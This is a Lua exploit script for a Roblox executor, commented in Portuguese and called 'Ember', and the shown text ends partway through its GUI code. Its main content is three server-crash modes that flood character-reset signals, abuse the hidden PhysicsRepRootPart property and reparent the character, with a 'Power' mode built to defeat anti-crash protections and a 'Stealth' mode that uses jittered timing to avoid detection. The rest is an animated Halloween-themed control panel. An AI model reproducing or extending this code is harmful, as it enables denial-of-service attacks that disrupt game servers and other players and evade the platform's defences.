--[[
    EMBER — ULTRA POWER EDITION
    Anti-Crash + Crash + Crash Avançado (Anti-AntiCrash)
    ------------------------------------------------------------
    • Aura pulsante ao redor do painel
    • Glow duplo (laranja + roxo) com rotação animada
    • Shimmer percorrendo o título
    • Partículas de brasa + faíscas roxas
    • Scanline energética atravessando o painel
    • Cards com badge lateral luminosa
    • 3 Modos: Normal | Power | Stealth
    • Barra de progresso anti-flood em tempo real
    • Log visual de métodos ativos
    • Contador de bypasses bem-sucedidos
    • Estética Halloween (abóbora + morcegos)
]]

local LightingService   = game:GetService("Lighting")
local Players           = game:GetService("Players")
local UserInputService  = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local TweenService      = game:GetService("TweenService")
local LocalPlayer       = Players.LocalPlayer
local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")

-- ============================================================
-- ANTI-CRASH
-- ============================================================

local AntiCrash = {
    Enabled = true,
    BlockedSignals = 0,
    BlockedHiddenProps = 0,
    BlockedParentHijack = 0,
    LastBlockTime = 0,
}

local OriginalReplicateSignal  = replicatesignal
local OriginalSetHiddenProperty = sethiddenproperty
local OriginalFireSignal        = firesignal

local signalCallTimes = {}
local SIGNAL_FLOOD_THRESHOLD = 30
local SIGNAL_WINDOW = 1.0

local function isSignalFlooding()
    local now = tick()
    for t, _ in pairs(signalCallTimes) do
        if now - t > SIGNAL_WINDOW then signalCallTimes[t] = nil end
    end
    local count = 0
    for _ in pairs(signalCallTimes) do count = count + 1 end
    return count >= SIGNAL_FLOOD_THRESHOLD
end

local function safeReplicateSignal(...)
    if not AntiCrash.Enabled then return OriginalReplicateSignal(...) end
    if isSignalFlooding() then
        AntiCrash.BlockedSignals = AntiCrash.BlockedSignals + 1
        AntiCrash.LastBlockTime = tick()
        return
    end
    signalCallTimes[tick()] = true
    local signal = ...
    if typeof(signal) == "RBXScriptSignal" then
        local n = tostring(signal)
        if n:find("ServerBreakJoints") or n:find("ServerResetCharacter") then
            AntiCrash.BlockedSignals = AntiCrash.BlockedSignals + 1
            return
        end
    end
    return OriginalReplicateSignal(...)
end

local function safeSetHiddenProperty(instance, property, value)
    if not AntiCrash.Enabled then return OriginalSetHiddenProperty(instance, property, value) end
    if property == "PhysicsRepRootPart" then
        AntiCrash.BlockedHiddenProps = AntiCrash.BlockedHiddenProps + 1
        return false
    end
    return OriginalSetHiddenProperty(instance, property, value)
end

local function safeFireSignal(...)
    if not AntiCrash.Enabled then return OriginalFireSignal(...) end
    if isSignalFlooding() then
        AntiCrash.BlockedSignals = AntiCrash.BlockedSignals + 1
        return
    end
    signalCallTimes[tick()] = true
    return OriginalFireSignal(...)
end

if getgenv then
    getgenv().replicatesignal = safeReplicateSignal
    getgenv().sethiddenproperty = safeSetHiddenProperty
    getgenv().firesignal = safeFireSignal
end

-- ============================================================
-- PROTEÇÃO DO PERSONAGEM
-- ============================================================

local function protectCharacter(character)
    if not character then return end
    character.AncestryChanged:Connect(function(_, parent)
        if parent ~= workspace and parent ~= nil and parent ~= game then
            AntiCrash.BlockedParentHijack = AntiCrash.BlockedParentHijack + 1
            warn("[Ember] Tentativa de mover personagem para:", parent:GetFullName())
            pcall(function() character.Parent = workspace end)
        end
    end)
end

-- ============================================================
-- ESTADOS
-- ============================================================

local State = {
    Active = false,
    LoopThread = nil,
    OriginalParent = nil,
    Character = nil,
    Humanoid = nil,
    Valid = nil,
    PhysicsLoop = nil,
    Keybind = Enum.KeyCode.R,
}

local PowerState = {
    Active = false,
    LoopThread = nil,
    PhysicsLoop = nil,
    Character = nil,
    Humanoid = nil,
    Valid = nil,
    OriginalParent = nil,
    CallTimestamps = {},
    AdaptiveDelay = 0.015,
    MaxDelay = 0.08,
    MinDelay = 0.008,
    SuccessfulBypasses = 0,
    CurrentMethod = "---",
}

local StealthState = {
    Active = false,
    LoopThread = nil,
    PhysicsLoop = nil,
    Character = nil,
    Humanoid = nil,
    Valid = nil,
    OriginalParent = nil,
    BaseDelay = 0.35,
    JitterRange = 0.15,
    SuccessfulBypasses = 0,
}

-- ============================================================
-- FUNÇÕES — CRASH NORMAL
-- ============================================================

local function startPhysicsLoop(character, humanoid, valid)
    return task.spawn(function()
        while State.Active and character and character.Parent do
            for index, current in valid do
                pcall(function()
                    safeSetHiddenProperty(current, "PhysicsRepRootPart", valid[index + 1] or valid[1])
                end)
            end
            task.wait()
        end
    end)
end

local function immediateReset(humanoid)
    if not humanoid then return end
    for _ = 1, 5 do
        pcall(function()
            safeReplicateSignal(humanoid.ServerBreakJoints)
            safeReplicateSignal(humanoid.ServerResetCharacter)
        end)
    end
end

local function mainResetLoop(character, humanoid)
    return task.spawn(function()
        for _ = 1, 9e9 do
            if not State.Active then break end
            if not character or not character.Parent then break end
            if not humanoid or not humanoid.Parent then break end
            pcall(function()
                safeReplicateSignal(humanoid.ServerBreakJoints)
                safeReplicateSignal(humanoid.ServerResetCharacter)
                character.Parent = LightingService
            end)
            task.wait()
        end
    end)
end

local function activateReset()
    if State.Active then return false end
    if PowerState.Active then deactivatePowerCrash() end
    if StealthState.Active then deactivateStealthCrash() end

    local character = LocalPlayer.Character
    if not character then warn("[Ember] Nenhum personagem.") return false end
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then warn("[Ember] Nenhum Humanoid.") return false end
    local valid = character:QueryDescendants("BasePart") or {}
    if #valid == 0 then warn("[Ember] Nenhum BasePart.") return false end

    State.Active = true
    State.Character = character
    State.Humanoid = humanoid
    State.Valid = valid
    State.OriginalParent = character.Parent

    State.PhysicsLoop = startPhysicsLoop(character, humanoid, valid)
    task.wait(0.1)
    if not State.Active then return false end
    immediateReset(humanoid)
    task.wait(0.1)
    if State.Active then
        State.LoopThread = mainResetLoop(character, humanoid)
    end
    print("[Ember] CRASH NORMAL ATIVADO")
    return true
end

local function deactivateReset()
    if not State.Active then return end
    State.Active = false
    if State.Character and State.Character.Parent == LightingService then
        pcall(function() State.Character.Parent = State.OriginalParent or workspace end)
    end
    State.LoopThread = nil
    State.PhysicsLoop = nil
    State.Character = nil
    State.Humanoid = nil
    State.Valid = nil
    print("[Ember] Crash normal desativado.")
end

-- ============================================================
-- FUNÇÕES — CRASH POWER (Anti-AntiCrash)
-- ============================================================

local function pruneTimestamps()
    local now = tick()
    for t, _ in pairs(PowerState.CallTimestamps) do
        if now - t > 1.0 then
            PowerState.CallTimestamps[t] = nil
        end
    end
end

local function getFloodCount()
    pruneTimestamps()
    local count = 0
    for _ in pairs(PowerState.CallTimestamps) do count = count + 1 end
    return count
end

local function isNearFlood()
    return getFloodCount() >= 20
end

local function registerCall()
    PowerState.CallTimestamps[tick()] = true
end

local function adaptiveWait()
    if isNearFlood() then
        PowerState.AdaptiveDelay = math.min(PowerState.AdaptiveDelay * 1.5, PowerState.MaxDelay)
    else
        PowerState.AdaptiveDelay = math.max(PowerState.AdaptiveDelay * 0.9, PowerState.MinDelay)
    end
    task.wait(PowerState.AdaptiveDelay)
end

local function method1_ReplicateSignal(humanoid)
    pcall(function()
        registerCall()
        OriginalReplicateSignal(humanoid.ServerBreakJoints)
    end)
    pcall(function()
        registerCall()
        OriginalReplicateSignal(humanoid.ServerResetCharacter)
    end)
end

local function method2_FireSignal(humanoid)
    pcall(function()
        registerCall()
        OriginalFireSignal(humanoid.ServerBreakJoints)
    end)
    pcall(function()
        registerCall()
        OriginalFireSignal(humanoid.ServerResetCharacter)
    end)
end

local function method3_Namecall(humanoid)
    pcall(function()
        humanoid.ServerBreakJoints:FireServer()
        humanoid.ServerResetCharacter:FireServer()
    end)
end

local function method4_PhysicsHijack(humanoid, character, valid)
    pcall(function()
        character.Parent = LightingService
        for i, part in valid do
            pcall(function()
                OriginalSetHiddenProperty(part, "PhysicsRepRootPart", valid[i + 1] or valid[1])
            end)
        end
    end)
end

local function method5_HealthKill(humanoid)
    pcall(function() humanoid.Health = 0 end)
    pcall(function() humanoid:TakeDamage(9e9) end)
    pcall(function() humanoid:BreakJoints() end)
end

local methodRotation = {
    {name = "ReplicateSignal", fn = method1_ReplicateSignal},
    {name = "FireSignal",      fn = method2_FireSignal},
    {name = "PhysicsHijack",   fn = method4_PhysicsHijack},
    {name = "HealthKill",      fn = method5_HealthKill},
    {name = "ReplicateSignal", fn = method1_ReplicateSignal},
    {name = "Namecall",        fn = method3_Namecall},
    {name = "PhysicsHijack",   fn = method4_PhysicsHijack},
    {name = "FireSignal",      fn = method2_FireSignal},
}

local rotationIndex = 1

local function executeRotatedMethod(humanoid, character, valid)
    local entry = methodRotation[rotationIndex]
    rotationIndex = (rotationIndex % #methodRotation) + 1
    PowerState.CurrentMethod = entry.name

    if entry.name == "PhysicsHijack" then
        entry.fn(humanoid, character, valid)
    else
        entry.fn(humanoid)
    end
end

local function startPowerPhysicsLoop(character, humanoid, valid)
    return task.spawn(function()
        while PowerState.Active and character and character.Parent do
            for i, current in valid do
                pcall(function()
                    OriginalSetHiddenProperty(current, "PhysicsRepRootPart", valid[i + 1] or valid[1])
                end)
                if math.random() > 0.7 then
                    task.wait(math.random(1, 3) / 1000)
                end
            end
            task.wait(PowerState.AdaptiveDelay)
        end
    end)
end

local function mainPowerLoop(character, humanoid, valid)
    return task.spawn(function()
        local iteration = 0
        for _ = 1, 9e9 do
            if not PowerState.Active then break end
            if not character or not character.Parent then break end
            if not humanoid or not humanoid.Parent then break end

            iteration = iteration + 1
            executeRotatedMethod(humanoid, character, valid)

            if iteration % 5 == 0 then
                pcall(function() character.Parent = LightingService end)
            end
            if iteration % 10 == 0 then
                pcall(function() character.Parent = PowerState.OriginalParent or workspace end)
            end
            if humanoid.Health <= 0 then
                PowerState.SuccessfulBypasses = PowerState.SuccessfulBypasses + 1
            end

            adaptiveWait()
        end
    end)
end

local function activatePowerCrash()
    if PowerState.Active then return false end
    if State.Active then deactivateReset() end
    if StealthState.Active then deactivateStealthCrash() end

    local character = LocalPlayer.Character
    if not character then warn("[Ember POWER] Nenhum personagem.") return false end
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then warn("[Ember POWER] Nenhum Humanoid.") return false end
    local valid = character:QueryDescendants("BasePart") or {}
    if #valid == 0 then warn("[Ember POWER] Nenhum BasePart.") return false end

    PowerState.Active = true
    PowerState.Character = character
    PowerState.Humanoid = humanoid
    PowerState.Valid = valid
    PowerState.OriginalParent = character.Parent
    PowerState.CallTimestamps = {}
    PowerState.AdaptiveDelay = 0.015
    PowerState.SuccessfulBypasses = 0
    rotationIndex = 1

    PowerState.PhysicsLoop = startPowerPhysicsLoop(character, humanoid, valid)
    task.wait(0.05)

    for _, entry in ipairs(methodRotation) do
        pcall(function()
            if entry.name == "PhysicsHijack" then
                entry.fn(humanoid, character, valid)
            else
                entry.fn(humanoid)
            end
        end)
        task.wait(0.01)
    end

    task.wait(0.1)
    if PowerState.Active then
        PowerState.LoopThread = mainPowerLoop(character, humanoid, valid)
    end
    print("[Ember POWER] CRASH AVANCADO ATIVADO - Burlar anti-crash")
    return true
end

local function deactivatePowerCrash()
    if not PowerState.Active then return end
    PowerState.Active = false
    if PowerState.Character and PowerState.Character.Parent == LightingService then
        pcall(function()
            PowerState.Character.Parent = PowerState.OriginalParent or workspace
        end)
    end
    PowerState.LoopThread = nil
    PowerState.PhysicsLoop = nil
    PowerState.Character = nil
    PowerState.Humanoid = nil
    PowerState.Valid = nil
    PowerState.CurrentMethod = "---"
    print("[Ember POWER] Crash avancado desativado.")
end

-- ============================================================
-- FUNÇÕES — CRASH STEALTH (Modo Furtivo)
-- ============================================================

local function startStealthPhysicsLoop(character, humanoid, valid)
    return task.spawn(function()
        while StealthState.Active and character and character.Parent do
            for i, current in valid do
                pcall(function()
                    OriginalSetHiddenProperty(current, "PhysicsRepRootPart", valid[i + 1] or valid[1])
                end)
            end
            task.wait(StealthState.BaseDelay + math.random() * StealthState.JitterRange)
        end
    end)
end

local function mainStealthLoop(character, humanoid, valid)
    return task.spawn(function()
        for _ = 1, 9e9 do
            if not StealthState.Active then break end
            if not character or not character.Parent then break end
            if not humanoid or not humanoid.Parent then break end

            pcall(function()
                registerCall()
                OriginalReplicateSignal(humanoid.ServerResetCharacter)
            end)

            if math.random() > 0.6 then
                pcall(function() humanoid.Health = 0 end)
            end

            if humanoid.Health <= 0 then
                StealthState.SuccessfulBypasses = StealthState.SuccessfulBypasses + 1
            end

            task.wait(StealthState.BaseDelay + math.random() * StealthState.JitterRange)
        end
    end)
end

local function activateStealthCrash()
    if StealthState.Active then return false end
    if State.Active then deactivateReset() end
    if PowerState.Active then deactivatePowerCrash() end

    local character = LocalPlayer.Character
    if not character then warn("[Ember STEALTH] Nenhum personagem.") return false end
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then warn("[Ember STEALTH] Nenhum Humanoid.") return false end
    local valid = character:QueryDescendants("BasePart") or {}
    if #valid == 0 then warn("[Ember STEALTH] Nenhum BasePart.") return false end

    StealthState.Active = true
    StealthState.Character = character
    StealthState.Humanoid = humanoid
    StealthState.Valid = valid
    StealthState.OriginalParent = character.Parent
    StealthState.SuccessfulBypasses = 0

    StealthState.PhysicsLoop = startStealthPhysicsLoop(character, humanoid, valid)
    task.wait(0.3)
    if StealthState.Active then
        StealthState.LoopThread = mainStealthLoop(character, humanoid, valid)
    end
    print("[Ember STEALTH] MODO FURTIVO ATIVADO - Passa por anti-crash")
    return true
end

local function deactivateStealthCrash()
    if not StealthState.Active then return end
    StealthState.Active = false
    if StealthState.Character and StealthState.Character.Parent == LightingService then
        pcall(function()
            StealthState.Character.Parent = StealthState.OriginalParent or workspace
        end)
    end
    StealthState.LoopThread = nil
    StealthState.PhysicsLoop = nil
    StealthState.Character = nil
    StealthState.Humanoid = nil
    StealthState.Valid = nil
    print("[Ember STEALTH] Modo furtivo desativado.")
end

-- ============================================================
-- PALETA ULTRA POWER (Halloween)
-- ============================================================

local COLORS = {
    BgOuter      = Color3.fromRGB(8, 3, 14),
    BgInner      = Color3.fromRGB(20, 8, 30),
    BgCard       = Color3.fromRGB(32, 14, 46),
    BgCardHi     = Color3.fromRGB(55, 22, 75),

    Ember        = Color3.fromRGB(255, 90, 20),
    EmberHot     = Color3.fromRGB(255, 170, 50),
    EmberDeep    = Color3.fromRGB(190, 50, 5),
    EmberGlow    = Color3.fromRGB(255, 210, 130),

    Purple       = Color3.fromRGB(170, 70, 240),
    PurpleDeep   = Color3.fromRGB(70, 20, 130),
    PurpleGlow   = Color3.fromRGB(220, 160, 255),
    Magenta      = Color3.fromRGB(255, 70, 200),

    Blood        = Color3.fromRGB(190, 20, 45),
    BloodBright  = Color3.fromRGB(240, 55, 70),
    PowerRed     = Color3.fromRGB(255, 40, 40),
    PowerRedHot  = Color3.fromRGB(255, 100, 100),
    PowerDark    = Color3.fromRGB(80, 0, 0),

    StealthBlue  = Color3.fromRGB(40, 180, 255),
    StealthDark  = Color3.fromRGB(10, 40, 70),
    StealthGlow  = Color3.fromRGB(150, 220, 255),

    Bone         = Color3.fromRGB(245, 235, 220),
    BoneDim      = Color3.fromRGB(170, 150, 180),

    Green        = Color3.fromRGB(140, 255, 100),
    GreenGlow    = Color3.fromRGB(200, 255, 160),
    GreenDeep    = Color3.fromRGB(50, 170, 40),
}

-- ============================================================
-- GUI PRINCIPAL
-- ============================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "EmberUI_UltraPower"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = PlayerGui

-- Aura externa
local AuraFrame = Instance.new("Frame")
AuraFrame.Name = "Aura"
AuraFrame.Size = UDim2.new(0, 310, 0, 460)
AuraFrame.Position = UDim2.new(0, 15, 0.5, -230)
AuraFrame.BackgroundColor3 = COLORS.Ember
AuraFrame.BackgroundTransparency = 0.85
AuraFrame.BorderSizePixel = 0
AuraFrame.ZIndex = 0
AuraFrame.Parent = ScreenGui

local AuraCorner = Instance.new("UICorner")
AuraCorner.CornerRadius = UDim.new(0, 24)
AuraCorner.Parent = AuraFrame

local AuraGradient = Instance.new("UIGradient")
AuraGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.Ember),
    ColorSequenceKeypoint.new(0.33, COLORS.Magenta),
    ColorSequenceKeypoint.new(0.66, COLORS.Purple),
    ColorSequenceKeypoint.new(1, COLORS.EmberHot),
}
AuraGradient.Parent = AuraFrame

task.spawn(function()
    while AuraFrame.Parent do
        TweenService:Create(AuraGradient, TweenInfo.new(6, Enum.EasingStyle.Linear), {Rotation = 360}):Play()
        task.wait(6)
        AuraGradient.Rotation = 0
    end
end)

task.spawn(function()
    while AuraFrame.Parent do
        TweenService:Create(AuraFrame, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.65,
            Size = UDim2.new(0, 318, 0, 468),
        }):Play()
        task.wait(1.8)
        TweenService:Create(AuraFrame, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.9,
            Size = UDim2.new(0, 310, 0, 460),
        }):Play()
        task.wait(1.8)
    end
end)

-- Painel principal
local MainFrame = Instance.new("Frame")
MainFrame.Name = "EmberPanel"
MainFrame.Size = UDim2.new(0, 290, 0, 460)
MainFrame.Position = UDim2.new(0, 25, 0.5, -230)
MainFrame.BackgroundColor3 = COLORS.BgInner
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ZIndex = 2
MainFrame.Parent = ScreenGui

MainFrame:GetPropertyChangedSignal("Position"):Connect(function()
    AuraFrame.Position = MainFrame.Position - UDim2.new(0, 10, 0, 10)
end)

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 16)
MainCorner.Parent = MainFrame

local MainGradient = Instance.new("UIGradient")
MainGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.BgInner),
    ColorSequenceKeypoint.new(0.5, COLORS.BgOuter),
    ColorSequenceKeypoint.new(1, COLORS.PurpleDeep),
}
MainGradient.Rotation = 135
MainGradient.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = COLORS.Ember
MainStroke.Thickness = 2
MainStroke.Transparency = 0.1
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = MainFrame

local InnerGlow = Instance.new("Frame")
InnerGlow.Size = UDim2.new(1, -4, 1, -4)
InnerGlow.Position = UDim2.new(0, 2, 0, 2)
InnerGlow.BackgroundTransparency = 1
InnerGlow.BorderSizePixel = 0
InnerGlow.ZIndex = 1
InnerGlow.Parent = MainFrame

local InnerGlowCorner = Instance.new("UICorner")
InnerGlowCorner.CornerRadius = UDim.new(0, 14)
InnerGlowCorner.Parent = InnerGlow

local InnerGlowStroke = Instance.new("UIStroke")
InnerGlowStroke.Color = COLORS.PurpleGlow
InnerGlowStroke.Thickness = 1
InnerGlowStroke.Transparency = 0.6
InnerGlowStroke.Parent = InnerGlow

-- ============================================================
-- ORBES DE LUZ
-- ============================================================

local function makeOrb(pos, size, color)
    local orb = Instance.new("Frame")
    orb.Size = UDim2.new(0, size, 0, size)
    orb.Position = pos
    orb.BackgroundColor3 = color
    orb.BackgroundTransparency = 0.35
    orb.BorderSizePixel = 0
    orb.ZIndex = 1
    orb.Parent = MainFrame

    local oc = Instance.new("UICorner")
    oc.CornerRadius = UDim.new(1, 0)
    oc.Parent = orb

    task.spawn(function()
        while orb.Parent do
            TweenService:Create(orb, TweenInfo.new(2 + math.random(), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.7,
            }):Play()
            task.wait(2)
            TweenService:Create(orb, TweenInfo.new(2 + math.random(), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.3,
            }):Play()
            task.wait(2)
        end
    end)

    return orb
end

makeOrb(UDim2.new(0, -12, 0, -12), 46, COLORS.Ember)
makeOrb(UDim2.new(1, -34, 0, -12), 46, COLORS.Purple)
makeOrb(UDim2.new(0, -12, 1, -34), 46, COLORS.Magenta)
makeOrb(UDim2.new(1, -34, 1, -34), 46, COLORS.EmberHot)

-- ============================================================
-- HEADER
-- ============================================================

local HeaderFrame = Instance.new("Frame")
HeaderFrame.Size = UDim2.new(1, 0, 0, 68)
HeaderFrame.BackgroundColor3 = COLORS.BgOuter
HeaderFrame.BackgroundTransparency = 0.15
HeaderFrame.BorderSizePixel = 0
HeaderFrame.ZIndex = 3
HeaderFrame.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 16)
HeaderCorner.Parent = HeaderFrame

local HeaderFix = Instance.new("Frame")
HeaderFix.Size = UDim2.new(1, 0, 0, 18)
HeaderFix.Position = UDim2.new(0, 0, 1, -18)
HeaderFix.BackgroundColor3 = COLORS.BgOuter
HeaderFix.BackgroundTransparency = 0.15
HeaderFix.BorderSizePixel = 0
HeaderFix.ZIndex = 3
HeaderFix.Parent = HeaderFrame

local HeaderGradient = Instance.new("UIGradient")
HeaderGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 15, 50)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(110, 30, 15)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 10, 60)),
}
HeaderGradient.Rotation = 90
HeaderGradient.Parent = HeaderFrame

local HeaderTopLine = Instance.new("Frame")
HeaderTopLine.Size = UDim2.new(1, -20, 0, 2)
HeaderTopLine.Position = UDim2.new(0, 10, 0, 0)
HeaderTopLine.BackgroundColor3 = COLORS.EmberHot
HeaderTopLine.BorderSizePixel = 0
HeaderTopLine.ZIndex = 4
HeaderTopLine.Parent = HeaderFrame

local HeaderTopLineCorner = Instance.new("UICorner")
HeaderTopLineCorner.CornerRadius = UDim.new(1, 0)
HeaderTopLineCorner.Parent = HeaderTopLine

task.spawn(function()
    while HeaderTopLine.Parent do
        TweenService:Create(HeaderTopLine, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.2,
        }):Play()
        task.wait(1.5)
        TweenService:Create(HeaderTopLine, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.8,
        }):Play()
        task.wait(1.5)
    end
end)

-- Abóbora (mantida)
local PumpkinIcon = Instance.new("TextLabel")
PumpkinIcon.Size = UDim2.new(0, 46, 0, 46)
PumpkinIcon.Position = UDim2.new(0, 10, 0, 11)
PumpkinIcon.BackgroundTransparency = 1
PumpkinIcon.Text = "🎃"
PumpkinIcon.TextSize = 36
PumpkinIcon.Font = Enum.Font.GothamBold
PumpkinIcon.ZIndex = 5
PumpkinIcon.Parent = HeaderFrame

task.spawn(function()
    while PumpkinIcon.Parent do
        TweenService:Create(PumpkinIcon, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
            TextSize = 42,
            Rotation = 8,
            Position = UDim2.new(0, 10, 0, 7),
        }):Play()
        task.wait(0.5)
        TweenService:Create(PumpkinIcon, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
            TextSize = 34,
            Rotation = -8,
            Position = UDim2.new(0, 10, 0, 14),
        }):Play()
        task.wait(0.5)
    end
end)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -76, 0, 26)
Title.Position = UDim2.new(0, 62, 0, 12)
Title.BackgroundTransparency = 1
Title.Text = "EMBER"
Title.TextColor3 = COLORS.EmberHot
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 24
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextStrokeTransparency = 0.5
Title.TextStrokeColor3 = COLORS.EmberDeep
Title.ZIndex = 5
Title.Parent = HeaderFrame

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.EmberHot),
    ColorSequenceKeypoint.new(0.5, COLORS.Ember),
    ColorSequenceKeypoint.new(1, COLORS.BloodBright),
}
TitleGradient.Parent = Title

task.spawn(function()
    while Title.Parent do
        for i = 0, 1, 0.05 do
            TitleGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, COLORS.EmberHot),
                ColorSequenceKeypoint.new(math.clamp(i - 0.1, 0, 1), COLORS.Ember),
                ColorSequenceKeypoint.new(math.clamp(i, 0, 1), Color3.fromRGB(255, 250, 220)),
                ColorSequenceKeypoint.new(math.clamp(i + 0.1, 0, 1), COLORS.Ember),
                ColorSequenceKeypoint.new(1, COLORS.BloodBright),
            }
            task.wait(0.02)
        end
        task.wait(1.5)
    end
end)

local Subtitle = Instance.new("TextLabel")
Subtitle.Size = UDim2.new(1, -76, 0, 16)
Subtitle.Position = UDim2.new(0, 62, 0, 38)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "ULTRA POWER  |  STEALTH  |  ANTI-CRASH"
Subtitle.TextColor3 = COLORS.PurpleGlow
Subtitle.Font = Enum.Font.GothamBold
Subtitle.TextSize = 10
Subtitle.TextXAlignment = Enum.TextXAlignment.Left
Subtitle.ZIndex = 5
Subtitle.Parent = HeaderFrame

-- Morcego decorativo (canto superior direito)
local BatIcon = Instance.new("TextLabel")
BatIcon.Size = UDim2.new(0, 30, 0, 30)
BatIcon.Position = UDim2.new(1, -40, 0, 20)
BatIcon.BackgroundTransparency = 1
BatIcon.Text = "🦇"
BatIcon.TextSize = 24
BatIcon.ZIndex = 5
BatIcon.Parent = HeaderFrame

task.spawn(function()
    while BatIcon.Parent do
        TweenService:Create(BatIcon, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Rotation = 20,
            TextSize = 28,
            Position = UDim2.new(1, -40, 0, 16),
        }):Play()
        task.wait(1.2)
        TweenService:Create(BatIcon, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Rotation = -20,
            TextSize = 22,
            Position = UDim2.new(1, -40, 0, 24),
        }):Play()
        task.wait(1.2)
    end
end)

-- Morcegos decorativos flutuando (no fundo do painel)
task.spawn(function()
    while MainFrame.Parent do
        local bat = Instance.new("TextLabel")
        bat.Size = UDim2.new(0, 18, 0, 18)
        bat.Position = UDim2.new(-0.1, 0, math.random(0.15, 0.9), 0)
        bat.BackgroundTransparency = 1
        bat.Text = "🦇"
        bat.TextSize = math.random(12, 18)
        bat.TextColor3 = Color3.fromRGB(120, 60, 160)
        bat.TextTransparency = 0.4
        bat.ZIndex = 1
        bat.Parent = MainFrame

        TweenService:Create(bat, TweenInfo.new(4 + math.random() * 2, Enum.EasingStyle.Linear), {
            Position = UDim2.new(1.1, 0, bat.Position.Y.Scale + math.random(-0.1, 0.1), 0),
            TextTransparency = 1,
            Rotation = math.random(-30, 30),
        }):Play()

        task.delay(6, function() if bat then bat:Destroy() end end)
        task.wait(math.random(30, 60) / 10)
    end
end)

-- Scanline
local Scanline = Instance.new("Frame")
Scanline.Size = UDim2.new(1, -4, 0, 3)
Scanline.Position = UDim2.new(0, 2, 0, -5)
Scanline.BackgroundColor3 = COLORS.EmberHot
Scanline.BorderSizePixel = 0
Scanline.BackgroundTransparency = 0.3
Scanline.ZIndex = 10
Scanline.Parent = MainFrame

local ScanlineCorner = Instance.new("UICorner")
ScanlineCorner.CornerRadius = UDim.new(1, 0)
ScanlineCorner.Parent = Scanline

task.spawn(function()
    while Scanline.Parent do
        Scanline.Position = UDim2.new(0, 2, 0, -5)
        Scanline.BackgroundTransparency = 0.3
        TweenService:Create(Scanline, TweenInfo.new(2.5, Enum.EasingStyle.Linear), {
            Position = UDim2.new(0, 2, 1, 5),
            BackgroundTransparency = 0.85,
        }):Play()
        task.wait(2.5)
        task.wait(1.5)
    end
end)

-- ============================================================
-- CARDS DE STATUS
-- ============================================================

local function makeCard(yPos, label, color)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, -24, 0, 28)
    card.Position = UDim2.new(0, 12, 0, yPos)
    card.BackgroundColor3 = COLORS.BgCard
    card.BackgroundTransparency = 0.1
    card.BorderSizePixel = 0
    card.ZIndex = 4
    card.Parent = MainFrame

    local cc = Instance.new("UICorner")
    cc.CornerRadius = UDim.new(0, 8)
    cc.Parent = card

    local cardGrad = Instance.new("UIGradient")
    cardGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, COLORS.BgCard),
        ColorSequenceKeypoint.new(1, COLORS.BgCardHi),
    }
    cardGrad.Parent = card

    local cs = Instance.new("UIStroke")
    cs.Color = color
    cs.Thickness = 1
    cs.Transparency = 0.4
    cs.Parent = card

    local badge = Instance.new("Frame")
    badge.Size = UDim2.new(0, 3, 0.6, 0)
    badge.Position = UDim2.new(0, 5, 0.2, 0)
    badge.BackgroundColor3 = color
    badge.BorderSizePixel = 0
    badge.ZIndex = 5
    badge.Parent = card

    local badgeCorner = Instance.new("UICorner")
    badgeCorner.CornerRadius = UDim.new(1, 0)
    badgeCorner.Parent = badge

    task.spawn(function()
        while badge.Parent do
            TweenService:Create(badge, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.4,
                Size = UDim2.new(0, 3, 0.8, 0),
            }):Play()
            task.wait(1.4)
            TweenService:Create(badge, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0,
                Size = UDim2.new(0, 3, 0.6, 0),
            }):Play()
            task.wait(1.4)
        end
    end)

    local textLbl = Instance.new("TextLabel")
